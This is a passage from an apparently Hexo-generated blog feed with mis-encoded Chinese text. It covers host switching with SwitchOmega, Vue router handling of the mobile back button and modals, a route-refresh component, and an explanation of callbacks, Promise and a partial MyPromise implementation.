uatç”Ÿäº§ç¯å¢ƒå‡ºç°bugï¼Œéœ€è¦åœ¨æœ¬åœ°é‡ç°ï¼Œè¿™æ—¶éœ€è¦è¯·æ±‚çº¿ä¸Šçš„æ•°æ®ï¼Œä½¿ç”¨SwitchOmegaæ’ä»¶ï¼Œå¯ä»¥æ— ç¼åˆ‡æ¢hostã€‚å‡è®¾æœ¬åœ°ç¯å¢ƒè¯·æ±‚urlæ˜¯<code>10.23.31.122</code>ï¼Œä¿®æ”¹hoståï¼Œå®é™…è¯·æ±‚åˆ°çš„åœ°å€æ˜¯<code>hbank.haday.cn:8093</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> è®¾ç½®æƒ…æ™¯æ¨¡å¼</span><br><span class="line"><span class="meta">#</span> è¯·æ±‚url -&gt; ä¿®æ”¹hoståå®é™…è¯·æ±‚çš„åœ°å€</span><br><span class="line">10.23.21.122 hbank.haday.cn:8093</span><br><span class="line">10.23.21.122 www.baidu.com</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ‰‹æœºæµè§ˆå™¨ç‰©ç†è¿”å›é”®</title>
      <link href="/2019/12/06/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%B7%AF%E7%94%B1/"/>
      <url>/2019/12/06/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E8%B7%AF%E7%94%B1/</url>
      <content type="html"><![CDATA[<h3 id="1-ç‰©ç†è¿”å›é”®"><a href="#1-ç‰©ç†è¿”å›é”®" class="headerlink" title="1. ç‰©ç†è¿”å›é”®"></a>1. ç‰©ç†è¿”å›é”®</h3><h4 id="1-1-éœ€æ±‚"><a href="#1-1-éœ€æ±‚" class="headerlink" title="1.1 éœ€æ±‚"></a>1.1 éœ€æ±‚</h4><p>ä¸€ä¸ªç§»åŠ¨ç«¯çš„é¡¹ç›®ï¼Œäº§å“å¸Œæœ›é¡µé¢ä¸Šçš„è¿”å›æŒ‰é’®ï¼Œå’Œæ‰‹æœºçš„ç‰©ç†è¿”å›é”®é€»è¾‘ä¿æŒä¸€è‡´ã€‚éœ€è¦æ»¡è¶³ä¸‹é¢å‡ ä¸ªè¦æ±‚</p><ul><li>é¡µé¢ä¸Šçš„è¿”å›æŒ‰é’®ï¼Œä¸ç‰©ç†è¿”å›é”®æ•ˆæœä¿æŒä¸€è‡´</li><li>è¿”å›åï¼Œç‚¹å‡»ç‰©ç†å‰è¿›é”®èƒ½æ­£å¸¸å‰è¿›</li><li>å½“å‰é¡µé¢æ‰“å¼€äº†ä¸€ä¸ªç»„ä»¶ï¼Œåˆ·æ–°é¡µé¢ï¼Œç»„ä»¶è¦æ­£å¸¸æ˜¾ç¤º</li><li>å½“ç”¨æˆ·æ‰“å¼€ä¸€ä¸ªæ–°çš„tabï¼Œåœ°å€æ˜¯/#/A?model=Bï¼Œéœ€è¦æ­£å¸¸æ˜¾ç¤ºç»„ä»¶B</li></ul><p><br></p><h4 id="1-2-ç”¨ä¾‹"><a href="#1-2-ç”¨ä¾‹" class="headerlink" title="1.2 ç”¨ä¾‹"></a>1.2 ç”¨ä¾‹</h4><ul><li>é¡µé¢A -&gt; ç»„ä»¶B</li><li>é¡µé¢A -&gt; ç»„ä»¶B -&gt; é¡µé¢A</li><li>é¡µé¢A -&gt; ç»„ä»¶B -&gt; ç»„ä»¶C</li><li>é¡µé¢A -&gt; ç»„ä»¶B -&gt; åˆ·æ–°ï¼ˆç»„ä»¶Bä¸ä¼šæ¶ˆå¤±ï¼‰</li><li>æ‰“å¼€ä¸€ä¸ªæ–°é¡µé¢(/#/A?modal=B) -&gt; ç»„ä»¶B -&gt; ç‚¹å‡»è¿”å› -&gt; é¡µé¢A</li></ul><p><br></p><h4 id="1-3-è§£å†³æ–¹æ³•"><a href="#1-3-è§£å†³æ–¹æ³•" class="headerlink" title="1.3 è§£å†³æ–¹æ³•"></a>1.3 è§£å†³æ–¹æ³•</h4><ul><li>é¡µé¢çš„è¿”å›æŒ‰é’®ç»Ÿä¸€ç”¨ <code>this.$router.go(-1)</code></li><li>æ˜¾ç¤ºå¼¹æ¡†(ç»„ä»¶)ç»Ÿä¸€ç”¨<code>pushState</code>æ›´æ”¹hashï¼Œå‘è·¯ç”±å†å²æ¨å…¥ä¸€ä¸ªè®°å½•ï¼Œä½¿è·¯ç”±å˜æˆ /#/A?model=Bã€‚è¿™é‡Œçš„é¡µé¢Aå§‹ç»ˆä¸ä¼šè¢«åˆ·æ–°</li><li>ç»„ä»¶å†…ç›‘å¬è·¯ç”±å˜åŒ–ï¼Œç›‘å¬åˆ°ä¸Šé¢ä¸¤ä¸ªåŠ¨ä½œï¼Œæ‰§è¡Œæ˜¾ç¤ºå’Œéšè—ç»„ä»¶åŠ¨ä½œ</li><li>è®¿é—®åœ°å€/#/A?model=Bï¼Œæ­£å¸¸æ˜¾ç¤ºBã€‚åœ¨ç»„ä»¶çš„mountedæ–¹æ³•ï¼Œæ£€æŸ¥è·¯ç”±æ˜¯å¦å¸¦modalï¼Œ å¦‚æœæ˜¯éœ€è¦æŒ‰éœ€æ¨è¿›å¤šä¸ªè·¯ç”±è·¯å¾„ï¼ˆä¿è¯åé€€æ­£å¸¸ï¼‰</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    name: <span class="string">'component-name'</span>,</span><br><span class="line">    watch: &#123;</span><br><span class="line">        <span class="string">'$route.query'</span>(newVal, oldVal) &#123;</span><br><span class="line">            <span class="keyword">if</span> (oldVal.modal === <span class="keyword">this</span>.$options.name &amp;&amp; !newVal.modal) &#123;</span><br><span class="line">                <span class="keyword">this</span>.visible = <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (newVal.modal === <span class="keyword">this</span>.$options.name) &#123;</span><br><span class="line">                <span class="keyword">this</span>.visible = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        <span class="comment">// æ˜¾ç¤ºé™„ä»¶åˆ—è¡¨</span></span><br><span class="line">        showModal () &#123;</span><br><span class="line">            <span class="keyword">this</span>.$router.push(&#123; </span><br><span class="line">                path: <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.$route.path&#125;</span>`</span>, </span><br><span class="line">                query: &#123; <span class="attr">modal</span>: <span class="keyword">this</span>.$options.name &#125; </span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// éšè—é™„ä»¶åˆ—è¡¨</span></span><br><span class="line">        hideModal () &#123;</span><br><span class="line">            <span class="keyword">this</span>.$router.go(<span class="number">-1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>é¡µé¢A -&gt; ç»„ä»¶B -&gt; é¡µé¢Cï¼Œä¸ºäº†å…¼å®¹é¡µé¢Cç‚¹å‡»è¿”å›æ—¶ï¼Œèƒ½æ˜¾ç¤ºç»„ä»¶B<br>é¡µé¢A -&gt; ç»„ä»¶B -&gt; ç»„ä»¶Cï¼ŒåŒç†åœ¨ç»„ä»¶Cæ¨è¿›è·¯ç”±<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç»„ä»¶B</span></span><br><span class="line">mounted () &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.$route.query.modal &amp;&amp; <span class="keyword">this</span>.$route.query.modal == <span class="keyword">this</span>.$options.name) &#123;</span><br><span class="line">      <span class="comment">// ä»å¦ä¸€ä¸ªè·¯ç”±è¿”å›ï¼Œè·¯ç”±å¸¦modalå‚æ•°</span></span><br><span class="line">      <span class="keyword">this</span>.$router.replace(&#123; <span class="attr">path</span>: <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.$route.path&#125;</span>`</span> &#125;)</span><br><span class="line">      <span class="keyword">this</span>.$router.push(&#123; </span><br><span class="line">        path: <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.$route.path&#125;</span>`</span>,</span><br><span class="line">        query: &#123; <span class="attr">modal</span>: <span class="keyword">this</span>.$options.name &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure></p><p><br><br><em>è¿™é‡Œå­˜åœ¨ä¸¤ä¸ªé—®é¢˜</em></p><ol><li><p>é¡µé¢A -&gt; ç»„ä»¶B -&gt; ç»„ä»¶C -&gt; é¡µé¢D<br>åœ¨é¡µé¢Dè¿”å›æ—¶å€™ã€‚ /#/A?model=C, ç”±äºç»„ä»¶B ä½¿ç”¨v-ifæ¥æ˜¾ç¤ºéšè—ï¼Œæ­¤æ—¶ç»„ä»¶B v-if=falseï¼Œå¯¼è‡´ç»„ä»¶Cæ²¡æœ‰æŒ‚è½½ï¼ŒCä¸­çš„mountedæ–¹æ³•æ— æ³•æ‰§è¡Œ</p><p>æ”¹æˆv-show? ç”¨v-ifå¯ä»¥å‡å°‘å¾ˆå¤šç©ºå€¼çš„å…¼å®¹</p></li><li><p>é¡µé¢A -&gt; ç»„ä»¶B -&gt; é¡µé¢D<br>é¡µé¢A -&gt; ç»„ä»¶C -&gt; ç»„ä»¶B -&gt; é¡µé¢D<br>ä¸Šé¢çš„mountedæ–¹æ³•é‡Œï¼Œå®šä¹‰äº†ç»„ä»¶Båœ¨ç¬¬äºŒå±‚ã€‚å½“å…¶ä»–åœ°æ–¹è°ƒç”¨çš„ç»„ä»¶Båœ¨ç¬¬ä¸‰å±‚ï¼Œé¡µé¢Dè¿”å›æ—¶ï¼Œæ˜¾ç¤ºç»„ä»¶Bï¼Œå†ç‚¹å‡»è¿”å›ï¼Œå°±ç›´æ¥å›åˆ°äº†é¡µé¢Aï¼Œç»„ä»¶Cè¢«è·³è¿‡ã€‚è¿™é‡Œé™å®šäº†ç»„ä»¶Båªèƒ½åœ¨ç¬¬äºŒå±‚ã€‚</p></li></ol><p><br></p><h3 id="2-åˆ·æ–°å½“å‰è·¯ç”±"><a href="#2-åˆ·æ–°å½“å‰è·¯ç”±" class="headerlink" title="2. åˆ·æ–°å½“å‰è·¯ç”±"></a>2. åˆ·æ–°å½“å‰è·¯ç”±</h3><p>è·¯ç”±åˆ·æ–°çš„ä¸­è½¬æ–‡ä»¶ï¼Œæ³¨å†Œä¸€ä¸ªè·¯ç”± /refresh -&gt; refresh.vueã€‚è°ƒç”¨ <em><code>this.$router.replace({ path: &#39;/refresh&#39; })</code></em> æ¥åˆ·æ–°å½“å‰è·¯ç”±ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- refresh.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span></span><br><span class="line"><span class="javascript">    next(<span class="function"><span class="params">vm</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> query = vm.$route.query || &#123;&#125;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> params = vm.$route.params || &#123;&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> &#123;</span></span><br><span class="line"><span class="undefined">        newRoute</span></span><br><span class="line"><span class="undefined">      &#125; = params</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 1. newRoute ä½¿ç”¨æ–°çš„è·¯ç”±å¯¹è±¡åˆ·æ–°ç•Œé¢</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 2. ä½¿ç”¨åŸæ¥çš„è·¯å¾„å’Œæ–°çš„å‚æ•°åˆ·æ–°ç•Œé¢</span></span></span><br><span class="line"><span class="undefined">      vm.$router.replace(newRoute || &#123;</span></span><br><span class="line"><span class="javascript">        path: <span class="keyword">from</span>.path,</span></span><br><span class="line"><span class="undefined">        query,</span></span><br><span class="line"><span class="undefined">        params</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å¼‚æ­¥æ–¹æ³•ï¼šcallbackã€Promiseã€async/await</title>
      <link href="/2019/11/16/async-await/"/>
      <url>/2019/11/16/async-await/</url>
      <content type="html"><![CDATA[<h3 id="1-Promise"><a href="#1-Promise" class="headerlink" title="1. Promise"></a>1. Promise</h3><h4 id="1-1-Promise-è§£å†³äº†ä»€ä¹ˆé—®é¢˜"><a href="#1-1-Promise-è§£å†³äº†ä»€ä¹ˆé—®é¢˜" class="headerlink" title="1.1 Promise è§£å†³äº†ä»€ä¹ˆé—®é¢˜"></a>1.1 Promise è§£å†³äº†ä»€ä¹ˆé—®é¢˜</h4><p>ä¸ºä»€ä¹ˆè¯´Promiseè§£å†³äº†åœ°ç‹±å›è°ƒçš„é—®é¢˜ï¼Ÿæˆ‘ä»¬æŠŠåœ°ç‹±å›è°ƒçš„ä»£ç æ”¹å†™æˆè¿™æ ·ï¼Œè¿™æ ·çš„ä»£ç ç»„ç»‡å½¢å¼æ²¡æœ‰äº†å±‚å±‚åµŒå¥—çš„é—®é¢˜ï¼Œå’‹ä¸€çœ‹ï¼Œç”šè‡³è¿˜æ¯”Promiseçš„è¦ç®€æ´ã€‚ä½†å®ƒçš„æ¯ä¸€å¤„ä¾ç„¶å®¹æ˜“å—åˆ°â€œå›è°ƒåœ°ç‹±â€çš„å½±å“ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å›è°ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  then(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">then1</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">  then2(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">then2</span> (<span class="params"></span>) </span>&#123;&#125;<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="number">1</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="number">2</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123; &#125;)</span><br></pre></td></tr></table></figure></p><p>ä¸ºäº†å°†ç¬¬2ï¼Œ3ï¼Œ4æ­¥é“¾æ¥åœ¨ä¸€èµ·ä½¿ä»–ä»¬ç›¸ç»§å‘ç”Ÿï¼Œå›è°ƒéœ€è¦æˆ‘ä»¬å°†ç¬¬2 æ­¥ç¡¬ç¼–ç åœ¨ç¬¬1 æ­¥ä¸­ï¼Œå°†ç¬¬3 æ­¥ç¡¬ç¼–ç åœ¨ç¬¬2 æ­¥ä¸­ï¼Œå°†ç¬¬4 æ­¥ç¡¬ç¼–ç åœ¨ç¬¬3 æ­¥ä¸­ï¼Œå¦‚æ­¤ç»§ç»­ã€‚</p><p><em>Promiseè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼š</em></p><ul><li><p>æä¾›ä¸€ä¸ªæ ‡å‡†åŒ–çš„å¼‚æ­¥ç®¡ç†æµç¨‹<br>éœ€è¦è¿›è¡Œ ioã€ç­‰å¾…æˆ–è€…å…¶å®ƒå¼‚æ­¥æ“ä½œçš„å‡½æ•°ï¼Œä¸è¿”å›çœŸå®ç»“æœï¼Œè€Œè¿”å›ä¸€ä¸ªâ€œæ‰¿è¯ºâ€ã€‚ä½ åªéœ€è¦è®¾ç½®å›è°ƒï¼Œç­‰å¾…æ‰¿è¯ºå…‘ç°ï¼Œè§£å†³å›è°ƒå‡½æ•°ç›¸äº’è°ƒç”¨ä¹‹é—´çš„æ ‡å‡†ï¼ˆä¿¡ä»»ï¼‰é—®é¢˜ã€‚</p></li><li><p>é“¾å¼è°ƒç”¨å–ä»£å›è°ƒåµŒå¥—ï¼Œå¤„ç†æµç¨‹æ›´çº¿æ€§<br>è¿‡å¤šçš„å›è°ƒä¼šå¯¼è‡´ä»£ç çš„é€»è¾‘ä¸è¿è´¯ã€ä¸çº¿æ€§ï¼Œä¸ç¬¦åˆç›´è§‰ã€‚Promiseå°è£…å¼‚æ­¥ä»£ç ï¼Œå¯ä»¥è®©å¤„ç†æµç¨‹å˜å¾—çº¿æ€§ï¼Œåªéœ€è¦å…³æ³¨è¾“å…¥å’Œè¾“å‡ºã€‚</p></li><li><p>æŒ‡å®šå›è°ƒå‡½æ•°æ›´åŠ çµæ´»<br>promiseä¹‹å‰ï¼šå¿…é¡»åœ¨å¯åŠ¨å¼‚æ­¥ä»»åŠ¡å‰æŒ‡å®š<br>promiseï¼šå¯åŠ¨å¼‚æ­¥ä»»åŠ¡=&gt; è¿”å›promiseå¯¹è±¡=&gt; ç»™promise å¯¹è±¡ç»‘å®šå›è°ƒå‡½æ•°ï¼ˆå¯ä»¥ç»‘å®šå¤šä¸ªï¼Œå»¶æ—¶ç»‘å®šï¼‰</p></li></ul><p><br></p><h4 id="1-1-Promise-å®ç°åŸç†"><a href="#1-1-Promise-å®ç°åŸç†" class="headerlink" title="1.1 Promise å®ç°åŸç†"></a>1.1 Promise å®ç°åŸç†</h4><p>Promiseå®é™…è¿˜æ˜¯ä½¿ç”¨å›è°ƒå‡½æ•°ã€‚å®ƒä¸ºæ¯ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡åˆ›å»ºä¸€ä¸ªPromiseå®ä¾‹ï¼Œç»´æŠ¤ä¸€ä¸ªè§‚å¯Ÿè€…æ¨¡å¼ã€‚<strong>é€šè¿‡<code>.then</code>æ”¶é›†å›è°ƒ -&gt; å¼‚æ­¥è§¦å‘resolve -&gt; resolveè§¦å‘å›è°ƒæ‰§è¡Œã€‚</strong></p><ul><li><p>åŸºæœ¬åŠŸèƒ½</p><ul><li>Promiseæ¥æ”¶ä¸€ä¸ª<em><code>executor</code></em>ï¼Œåœ¨<em><code>new Promsie</code></em>çš„æ—¶å€™ç«‹åˆ»æ‰§è¡Œ</li><li>å¼‚æ­¥ä»»åŠ¡è¢«æ”¾å…¥å®ä»»åŠ¡é˜Ÿåˆ—ï¼Œç­‰å¾…æ‰§è¡Œ</li><li><em><code>then()</code></em>è¢«æ‰§è¡Œï¼Œæ”¶é›†å›è°ƒæ”¾å…¥æˆåŠŸ/å¤±è´¥å›è°ƒé˜Ÿåˆ—</li><li>å¼‚æ­¥ä»»åŠ¡æ‰§è¡ŒæˆåŠŸè°ƒç”¨<em><code>resolve</code></em>ï¼Œæ‰§è¡Œå¤±è´¥è°ƒç”¨<em><code>reject</code></em>ï¼ŒæˆåŠŸ/å¤±è´¥å›è°ƒé˜Ÿåˆ—æ‰§è¡Œ<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸€ä¸ªæç®€çš„Promise</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(executor) &#123;</span><br><span class="line">    <span class="keyword">this</span>._resolveQueue = []    <span class="comment">// thenæ”¶é›†çš„æ‰§è¡ŒæˆåŠŸçš„å›è°ƒé˜Ÿåˆ—</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// resolveç­‰å¾…è¢«å¼‚æ­¥ä»»åŠ¡æ‰§è¡Œï¼Œresolveæ‰§è¡Œæ—¶ï¼Œå–å‡ºå›è°ƒä¸€æ¬¡æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">let</span> _resolve = <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">this</span>._resolveQueue.length) &#123;</span><br><span class="line">        <span class="keyword">const</span> callback = <span class="keyword">this</span>._resolveQueue.shift()</span><br><span class="line">        callback(val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// new Promise()æ—¶ç«‹å³æ‰§è¡Œexecutor</span></span><br><span class="line">    executor(_resolve, _reject)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// thenæ–¹æ³•,æ¥æ”¶ä¸€ä¸ªæˆåŠŸçš„å›è°ƒå’Œä¸€ä¸ªå¤±è´¥çš„å›è°ƒï¼Œå¹¶pushè¿›é˜Ÿåˆ—</span></span><br><span class="line">  then(resolveFn, rejectFn) &#123;</span><br><span class="line">    <span class="keyword">this</span>._resolveQueue.push(resolveFn)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>é“¾å¼è°ƒç”¨</p><ul><li><code>then</code>è´Ÿè´£æ”¶é›†æˆåŠŸå›è°ƒ å’Œ å¤±è´¥å›è°ƒ</li><li><code>then</code>è¿”å›çš„ä¸€å®šæ˜¯ä¸€ä¸ªæ–°çš„Promiseï¼Œä¿è¯æ¯ä¸ªpromiseéƒ½æ˜¯ç‹¬ç«‹çš„</li><li><code>then</code>çš„å›è°ƒéœ€è¦æ‹¿åˆ°ä¸Šä¸€ä¸ª<code>then</code>çš„è¿”å›å€¼</li><li>å½“<code>then</code>é‡Œæ˜¯ä¸€ä¸ªpromiseçš„æ—¶å€™ï¼Œå¦‚ä½•å°†è¿™ä¸ªpromiseçš„å€¼ä¼ é€’ç»™ä¸‹ä¸€ä¸ªthen</li></ul></li><li><p>å»¶è¿Ÿæœºåˆ¶<br>æ— è®º<code>resolve</code>æ˜¯è¢«åŒæ­¥æ‰§è¡Œï¼Œè¿˜æ˜¯å¼‚æ­¥æ‰§è¡Œï¼Œéƒ½æ”¾åœ¨<code>setTimeout</code>ä¸­ä¿è¯å¼‚æ­¥æ‰§è¡Œã€‚ä¿è¯å›è°ƒå‡½æ•°å¯ä»¥å»¶è¿Ÿç»‘å®š</p></li><li><p>çŠ¶æ€æœº<br>PromiseçŠ¶æ€åªèƒ½æœ‰<code>Pending</code>, <code>Fulfilled</code>,<code>Rejected</code>ï¼ŒçŠ¶æ€çš„å˜æ›´æ˜¯å•å‘çš„ï¼Œåªèƒ½ä»Pending -&gt; Fulfilled, Pending -&gt; Rejectedï¼ŒçŠ¶æ€å˜æ›´ä¸å¯é€†</p></li></ul><p><br></p><h4 id="1-2-å®ç°ä¸€ä¸ªPromise"><a href="#1-2-å®ç°ä¸€ä¸ªPromise" class="headerlink" title="1.2 å®ç°ä¸€ä¸ªPromise"></a>1.2 å®ç°ä¸€ä¸ªPromise</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Promise/A+è§„å®šçš„ä¸‰ç§çŠ¶æ€</span></span><br><span class="line"><span class="keyword">const</span> PENDING = <span class="string">'pending'</span></span><br><span class="line"><span class="keyword">const</span> FULFILLED = <span class="string">'fulfilled'</span></span><br><span class="line"><span class="keyword">const</span> REJECTED = <span class="string">'rejected'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">  <span class="comment">// æ„é€ æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå›è°ƒ</span></span><br><span class="line">  <span class="keyword">constructor</span>(executor) &#123;</span><br><span class="line">    <span class="keyword">this</span>._status = PENDING     <span class="comment">// PromiseçŠ¶æ€</span></span><br><span class="line">    <span class="keyword">this</span>._value = <span class="literal">undefined</span>    <span class="comment">// 